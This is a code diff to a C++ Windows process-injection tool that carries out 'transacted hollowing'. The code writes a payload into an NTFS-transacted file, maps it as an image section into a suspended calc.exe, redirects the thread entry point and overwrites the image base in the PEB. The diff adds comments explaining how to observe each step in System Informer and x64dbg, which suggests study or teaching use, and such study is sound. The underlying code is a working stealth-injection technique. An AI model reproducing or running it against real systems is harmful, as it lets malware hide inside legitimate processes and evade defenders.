@@ -23,6 +23,7 @@ BYTE* GetPayloadBuffer(OUT size_t& p_size) {
     return bufferAddress;
 }
 
+// Here, the steps are similar to process doppledanging. We conduct the Transact, Load and Rollback parts of that technique.
 HANDLE MakeSectionWithTransaction(BYTE* payload_buffer, DWORD payload_size) {
     HANDLE hTransaction;
     HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
@@ -56,7 +57,7 @@ HANDLE MakeSectionWithTransaction(BYTE* payload_buffer, DWORD payload_size) {
     // create ntfs transaction
     _OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
-    status = pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
+    status = pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL); //viewable in the Handle tab of the system informer for the current process.
     if (!NT_SUCCESS(status)){
         perror("[-] Failed to create transaction object... \n");
         exit(-1);
@@ -79,7 +80,7 @@ HANDLE MakeSectionWithTransaction(BYTE* payload_buffer, DWORD payload_size) {
         perror("[-] Error writing file to the transacted file\n");
         exit(-1);
     }
-    printf("[+] Payload written to the transacted file\n");
+    printf("[+] Payload written to the transacted file\n"); // on system informer, right click on the section entry in the 'handles' tab and select 'read/write memory' to view the payload buffer.
 
     // create section from the transacted file
     status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0 , PAGE_READONLY, SEC_IMAGE, hTransactedFile);
@@ -105,19 +106,19 @@ HANDLE MakeSectionWithTransaction(BYTE* payload_buffer, DWORD payload_size) {
 
     return hSection;
 }
-
+// Step 2 - Similar to process hollowing, create a process in suspended state.
 HANDLE CreateSuspendedProcess(PROCESS_INFORMATION &pi){
     LPSTARTUPINFOW sInfo = new STARTUPINFOW();
     sInfo->cb = sizeof(STARTUPINFOW);
     HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
     wchar_t exePath[MAX_PATH];
     lstrcpyW(exePath, L"C:\\Windows\\System32\\calc.exe");
-    // Create Process In Suspended Mode
+    // Create Process In Suspended Mode. Can be searched in the 'system informer' as calc.exe
     if (!CreateProcessW(NULL, exePath, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, sInfo, &pi)) {
         perror("[-] Failed To Create Suspended Process.. \n");
         exit(-1);
     }
-    wprintf(L"[+] Created Process In Suspended Mode...\n");
+    wprintf(L"[+] Created Process In Suspended Mode...\n"); // click on the process, under threads - state column, it shows 'wait:suspended(1)' as expected.
     hTargetProcess = pi.hProcess;
     return hTargetProcess;
 }
@@ -139,12 +140,12 @@ PVOID MapSectionIntoProcess(HANDLE hProcess, HANDLE hSection) {
         perror("[-] Could not map section to target process\n");
         exit(-1);
     }
-    printf("[+] section mapping successful\n");
+    printf("[+] section mapping successful\n"); // you can see the section by right click 'calc.exe' in system informer and then 'memory' tab and find the address entry of the 'sectionBaseAddress'
     printf("[+] section base address: %p\n", sectionBaseAddress);
 
     return sectionBaseAddress;
 }
-
+// since the 'payload' as a section has been mapped inside target 'calc.exe' process, we will find the entry point of the payload within target calc.exe
 ULONG_PTR GetPayloadEntryPoint(HANDLE hProcess, PVOID sectionBaseAddress, BYTE* payload_buffer) {
     NTSTATUS status;
     ULONGLONG entrypoint;
@@ -191,7 +192,7 @@ BOOL TransactedHollowing(BYTE* payload_buffer, DWORD payload_size) {
     // Map section to target process
     PVOID sectionBaseAddress = MapSectionIntoProcess(hTargetProcess, hSection);
 
-    // Query process information
+    // Query target process information, in our case - calc.exe. This api will populate the 'pbi' parameter.
     status = pNtQueryInformationProcess(hTargetProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLen);
     if (!NT_SUCCESS(status)){
         perror("[-] failed to query target process information\n");
@@ -201,13 +202,13 @@ BOOL TransactedHollowing(BYTE* payload_buffer, DWORD payload_size) {
     // Get payload entrypoint
     entryPoint = GetPayloadEntryPoint(hTargetProcess, sectionBaseAddress, payload_buffer);
 
-    // change control flow by changing entry point
+    // change control flow of the calc.exe by changing entry point
     LPCONTEXT context = new CONTEXT();
     context->ContextFlags = CONTEXT_INTEGER;
     if(!GetThreadContext(pInfo.hThread, context)){
         perror("[-] unable to get the thread context\n");
         exit(-1);
-    }
+    } // for checking this part of thread entry point hijack, best to use the x64dbg and atttach to calc.exe. 
     // change entry point to the payload; x64 - rcx
     context->Rcx = entryPoint;
     if(!SetThreadContext(pInfo.hThread, context)){
@@ -220,15 +221,15 @@ BOOL TransactedHollowing(BYTE* payload_buffer, DWORD payload_size) {
     printf("[+] remote peb base addres; %p", remotePEB);
     ULONGLONG imageBaseOffset = sizeof(ULONGLONG) * 2;
     LPVOID remoteImageBase = (LPVOID)((ULONGLONG)remotePEB + imageBaseOffset);
-    printf("[+] address of the PEB pointing to image base: %p\n", imageBaseOffset);
-    // overwrite the original image base (in our case pointing to calc.exe) to the image base of the pyload64's base
+    printf("[+] address of the PEB pointing to image base: %p\n", remoteImageBase);
+    // overwrite the original image base (in our case pointing to calc.exe) to the image base of the pyload64's base. This is visible by viewing the PEB section in the memory tab of calc.exe and the second row (offset 16 bytes) being overwritten to change image base from legitimate calc.exe to our payload buffer address.
     SIZE_T written = 0;
     if(!WriteProcessMemory(pInfo.hProcess, remoteImageBase, &sectionBaseAddress, sizeof(ULONGLONG), &written)) {
         perror("[-] failed to write to the memory of the target process\n");
         exit(-1);
     }
 
-    printf("[+] updated the image base pointing to our payload: %p", remoteImageBase);
+    printf("[+] updated the image base pointing to our payload: %p\n", remoteImageBase);
 
     // Resuming the thread
     ResumeThread(pInfo.hThread);
